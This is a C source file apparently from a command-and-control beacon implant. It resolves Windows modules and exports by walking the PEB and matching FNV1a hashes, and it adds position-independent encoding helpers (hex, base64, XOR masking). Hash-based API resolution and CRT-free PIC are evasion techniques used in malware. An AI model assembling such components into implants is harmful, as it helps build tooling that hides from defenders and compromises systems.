/* beacon/src/Core/Ldr.c
 * PEB walk: NaxGetModule (by name-hash) + NaxGetProc (by export-hash).
 * PIC helpers: NaxHexEncode, NaxUToStr, NaxAsciiToWide.
 * PEB accessors use NaxCurrentPeb() (Defs.h overlay) - cast from NtCurrentTeb()
 * because MinGW cross-compile _PEB/_TEB hide most fields behind Reserved arrays. */

#include "Macros.h"
#include "Defs.h"
#include "Instance.h"
#include <winternl.h>

/* ========= [ PEB / TEB accessors ] ========= */

/* Returns PEB->Ldr cast to our NAX_PEB_LDR_DATA type.
 * NAX_PEB_LDR_DATA exposes InLoadOrderModuleList which MinGW's simplified
 * PEB_LDR_DATA does not; the cast is safe - layout is identical. */
FUNC PNAX_PEB_LDR_DATA NaxGetLdr( VOID ) {
    return (PNAX_PEB_LDR_DATA)NaxCurrentPeb()->Ldr;
}

/* Process heap handle - used by NaxBootstrap before Nax is allocated. */
FUNC HANDLE NaxGetProcessHeap( VOID ) {
    return (HANDLE)NaxCurrentPeb()->ProcessHeap;
}

/* ========= [ FNV1a-32 hash ] ========= */

/* Hash a narrow ASCII string uppercased. */
FUNC UINT32 NaxHashStr( const CHAR* str ) {
    UINT32 hash = 0x811C9DC5u;
    while ( *str ) {
        CHAR c = *str++;
        if ( c >= 'a' && c <= 'z' ) c -= 0x20;
        hash ^= (UINT32)(BYTE)c;
        hash *= 0x01000193u;
    }
    return hash;
}

/* Hash a wide (UTF-16LE) string via its low bytes uppercased. */
FUNC UINT32 NaxHashWStr( const WCHAR* str ) {
    UINT32 hash = 0x811C9DC5u;
    while ( *str ) {
        CHAR c = (CHAR)( *str++ & 0xFF );
        if ( c >= 'a' && c <= 'z' ) c -= 0x20;
        hash ^= (UINT32)(BYTE)c;
        hash *= 0x01000193u;
    }
    return hash;
}

/* ========= [ module lookup ] ========= */

/* Walk PEB InLoadOrderModuleList; return base of module whose name hashes to h. */
FUNC HMODULE NaxGetModule( UINT32 h ) {
    PNAX_PEB_LDR_DATA ldr  = NaxGetLdr();
    PLIST_ENTRY       head = &ldr->InLoadOrderModuleList;
    PLIST_ENTRY       cur  = head->Flink;

    while ( cur != head ) {
        PNAX_LDR_ENTRY entry = CONTAINING_RECORD( cur, NAX_LDR_ENTRY, InLoadOrderLinks );
        if ( entry->BaseDllName.Buffer != NULL ) {
            if ( NaxHashWStr( entry->BaseDllName.Buffer ) == h )
                return (HMODULE)entry->DllBase;
        }
        cur = cur->Flink;
    }
    return NULL;
}

/* ========= [ export lookup ] ========= */

/* Walk PE export table of `base`; return address of export whose name hashes to h.
 * Forwarded exports ("ModuleName.FunctionName") are resolved recursively.
 * Ordinal forwarding ("Module.#N") returns NULL - not implemented.         */
FUNC PVOID NaxGetProc( HMODULE base, UINT32 h ) {
    PBYTE b = B_PTR( base );

    PIMAGE_DOS_HEADER dos     = (PIMAGE_DOS_HEADER)b;
    PIMAGE_NT_HEADERS nt      = (PIMAGE_NT_HEADERS)( b + dos->e_lfanew );
    DWORD             expRva  = nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
    DWORD             expSize = nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;
    if ( expRva == 0 ) return NULL;

    PIMAGE_EXPORT_DIRECTORY exp   = (PIMAGE_EXPORT_DIRECTORY)( b + expRva );
    PDWORD                  names = (PDWORD)( b + exp->AddressOfNames );
    PWORD                   ords  = (PWORD)( b + exp->AddressOfNameOrdinals );
    PDWORD                  funcs = (PDWORD)( b + exp->AddressOfFunctions );

    for ( DWORD i = 0; i < exp->NumberOfNames; i++ ) {
        CHAR* name = (CHAR*)( b + names[ i ] );
        if ( NaxHashStr( name ) != h ) continue;

        PVOID addr = C_PTR( b + funcs[ ords[ i ] ] );

        /* forwarded export - "ModuleName.FunctionName" string inside exp dir */
        if ( (PBYTE)addr >= (PBYTE)exp && (PBYTE)addr < (PBYTE)exp + expSize ) {
            PCHAR fwd    = (PCHAR)addr;
            PCHAR dot    = fwd;
            WCHAR modW[ 64 ] = { 0 };
            INT   pfxLen = 0;

            while ( *dot && *dot != '.' ) dot++;
            if ( ! *dot ) return NULL;

            pfxLen = (INT)( dot - fwd );
            if ( pfxLen <= 0 || pfxLen > 59 ) return NULL;
            if ( *( dot + 1 ) == '#' ) return NULL;

            for ( INT j = 0; j < pfxLen; j++ ) modW[ j ] = (WCHAR)(BYTE)fwd[ j ];
            modW[ pfxLen ]     = L'.';
            modW[ pfxLen + 1 ] = L'd';
            modW[ pfxLen + 2 ] = L'l';
            modW[ pfxLen + 3 ] = L'l';
            modW[ pfxLen + 4 ] = L'\0';

            HMODULE fwdMod = NaxGetModule( NaxHashWStr( modW ) );
            if ( ! fwdMod ) return NULL;
            return NaxGetProc( fwdMod, NaxHashStr( dot + 1 ) );
        }
        return addr;
    }
    return NULL;
}

/* ========= [ PIC-safe helpers ] ========= */

/* Hex-encode `len` bytes of `src` into `dst` (no CRT, no static tables). */
FUNC VOID NaxHexEncode( const PBYTE src, UINT32 len, PCHAR dst ) {
    for ( UINT32 i = 0; i < len; i++ ) {
        BYTE hi    = ( src[i] >> 4 ) & 0x0Fu;
        BYTE lo    = src[i] & 0x0Fu;
        dst[2*i]   = hi < 10 ? '0' + hi : 'a' + hi - 10;
        dst[2*i+1] = lo < 10 ? '0' + lo : 'a' + lo - 10;
    }
    dst[2 * len] = '\0';
}

/* Write unsigned decimal of `val` into `buf` (not NUL-terminated). Returns byte count. */
FUNC UINT32 NaxUToStr( UINT32 val, PCHAR buf ) {
    CHAR   tmp[12];
    UINT32 i = 0, j = 0;
    if ( val == 0 ) { buf[0] = '0'; return 1; }
    while ( val > 0 ) { tmp[i++] = '0' + (CHAR)( val % 10 ); val /= 10; }
    while ( i > 0  ) { buf[j++] = tmp[--i]; }
    return j;
}

/* ASCII-to-wide copy (no CRT).  Writes at most `cap-1` wchars + NUL. */
FUNC VOID NaxAsciiToWide( const PCHAR src, PWCHAR dst, UINT32 cap ) {
    UINT32 i = 0;
    while ( src[i] && i < cap - 1 ) { dst[i] = (WCHAR)(BYTE)src[i]; i++; }
    dst[i] = L'\0';
}

/* ========= [ base64 encode ] ========= */

FUNC UINT32 NaxBase64Encode( const PBYTE src, UINT32 src_len, PCHAR dst, UINT32 dst_cap ) {
    CHAR tbl[] = {
        'A','B','C','D','E','F','G','H','I','J','K','L','M',
        'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
        'a','b','c','d','e','f','g','h','i','j','k','l','m',
        'n','o','p','q','r','s','t','u','v','w','x','y','z',
        '0','1','2','3','4','5','6','7','8','9','+','/' };

    UINT32 out_len = 4 * ( ( src_len + 2 ) / 3 );
    if ( dst_cap < out_len + 1 ) return 0;

    UINT32 i = 0, j = 0;
    while ( i < src_len ) {
        UINT32 a = i < src_len ? (BYTE)src[ i++ ] : 0;
        UINT32 b = i < src_len ? (BYTE)src[ i++ ] : 0;
        UINT32 c = i < src_len ? (BYTE)src[ i++ ] : 0;
        UINT32 triple = ( a << 16 ) | ( b << 8 ) | c;
        dst[ j++ ] = tbl[ ( triple >> 18 ) & 0x3F ];
        dst[ j++ ] = tbl[ ( triple >> 12 ) & 0x3F ];
        dst[ j++ ] = tbl[ ( triple >> 6  ) & 0x3F ];
        dst[ j++ ] = tbl[ triple & 0x3F ];
    }

    UINT32 pad = ( 3 - src_len % 3 ) % 3;
    for ( UINT32 p = 0; p < pad; p++ )
        dst[ out_len - 1 - p ] = '=';

    dst[ out_len ] = '\0';
    return out_len;
}

/* ========= [ base64url encode ] ========= */

FUNC UINT32 NaxBase64UrlEncode( const PBYTE src, UINT32 src_len, PCHAR dst, UINT32 dst_cap ) {
    UINT32 n = NaxBase64Encode( src, src_len, dst, dst_cap );
    for ( UINT32 i = 0; i < n; i++ ) {
        if ( dst[i] == '+' ) dst[i] = '-';
        else if ( dst[i] == '/' ) dst[i] = '_';
        else if ( dst[i] == '=' ) { n = i; dst[i] = '\0'; break; }
    }
    return n;
}

/* ========= [ base64 decode ] ========= */

FUNC INT NaxB64Val( CHAR c ) {
    if ( c >= 'A' && c <= 'Z' ) return c - 'A';
    if ( c >= 'a' && c <= 'z' ) return c - 'a' + 26;
    if ( c >= '0' && c <= '9' ) return c - '0' + 52;
    if ( c == '+' || c == '-' ) return 62;
    if ( c == '/' || c == '_' ) return 63;
    return -1;
}

FUNC UINT32 NaxBase64Decode( const PCHAR src, UINT32 src_len, PBYTE dst, UINT32 dst_cap ) {
    UINT32 di = 0;
    UINT32 si = 0;
    while ( si < src_len && di < dst_cap ) {
        INT a = -1, b = -1, c = -1, d = -1;
        while ( si < src_len && a < 0 ) a = NaxB64Val( src[si++] );
        while ( si < src_len && b < 0 ) b = NaxB64Val( src[si++] );
        if ( a < 0 || b < 0 ) break;
        dst[di++] = (BYTE)( ( a << 2 ) | ( b >> 4 ) );
        while ( si < src_len && src[si] == '=' ) si++;
        if ( si >= src_len ) break;
        c = NaxB64Val( src[si++] );
        if ( c < 0 ) break;
        if ( di < dst_cap ) dst[di++] = (BYTE)( ( ( b & 0x0F ) << 4 ) | ( c >> 2 ) );
        while ( si < src_len && src[si] == '=' ) si++;
        if ( si >= src_len ) break;
        d = NaxB64Val( src[si++] );
        if ( d < 0 ) break;
        if ( di < dst_cap ) dst[di++] = (BYTE)( ( ( c & 0x03 ) << 6 ) | d );
    }
    return di;
}

/* ========= [ hex decode ] ========= */

FUNC INT NaxHexNibble( CHAR c ) {
    if ( c >= '0' && c <= '9' ) return c - '0';
    if ( c >= 'a' && c <= 'f' ) return c - 'a' + 10;
    if ( c >= 'A' && c <= 'F' ) return c - 'A' + 10;
    return -1;
}

FUNC UINT32 NaxHexDecode( const PCHAR src, UINT32 src_len, PBYTE dst, UINT32 dst_cap ) {
    UINT32 di = 0;
    for ( UINT32 i = 0; i + 1 < src_len && di < dst_cap; i += 2 ) {
        INT hi = NaxHexNibble( src[i] );
        INT lo = NaxHexNibble( src[i + 1] );
        if ( hi < 0 || lo < 0 ) break;
        dst[di++] = (BYTE)( ( hi << 4 ) | lo );
    }
    return di;
}

/* ========= [ XOR mask/unmask ] ========= */

FUNC UINT32 NaxXorMask( PNAX_INSTANCE Nax, const PBYTE src, UINT32 src_len, PBYTE dst, UINT32 dst_cap ) {
    if ( dst_cap < src_len + 4 ) return 0;
    BYTE key[4];
    Nax->Bcrypt.BCryptGenRandom( NULL, key, 4, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
    MmCopy( dst, key, 4 );
    for ( UINT32 i = 0; i < src_len; i++ )
        dst[4 + i] = src[i] ^ key[i % 4];
    return src_len + 4;
}

FUNC UINT32 NaxXorUnmask( const PBYTE src, UINT32 src_len, PBYTE dst, UINT32 dst_cap ) {
    if ( src_len < 4 ) return 0;
    UINT32 data_len = src_len - 4;
    if ( dst_cap < data_len ) return 0;
    PBYTE key = src;
    for ( UINT32 i = 0; i < data_len; i++ )
        dst[i] = src[4 + i] ^ key[i % 4];
    return data_len;
}
